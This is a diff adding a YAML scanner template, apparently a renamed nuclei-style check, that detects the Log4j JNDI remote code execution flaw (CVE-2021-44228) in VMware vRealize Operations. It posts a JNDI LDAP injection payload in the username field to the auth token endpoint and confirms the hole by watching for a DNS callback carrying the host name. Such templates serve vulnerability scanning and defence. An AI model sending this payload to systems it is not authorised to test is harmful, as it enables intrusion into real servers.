@@ -1,0 +1,32 @@
+id: vrealize-operations-log4j-rce
+brief:
+    title: VMware vRealize Operations Tenant - JNDI Remote Code Execution (Apache Log4j)
+    by: bughuntersurya
+    level: critical
+    about: VMware vRealize Operations is susceptible to a critical vulnerability in Apache Log4j which may allow remote code execution in an impacted vRealize Operations Tenant application.
+    label:
+        - cve
+        - cve2021
+        - oast
+        - rce
+        - log4j
+        - vmware
+        - vrealize
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/suite-api/api/auth/token/acquire'
+      head:
+        Content-Type: application/json
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}/ui/'
+      body: '{"username":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}","password":"admin"}'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
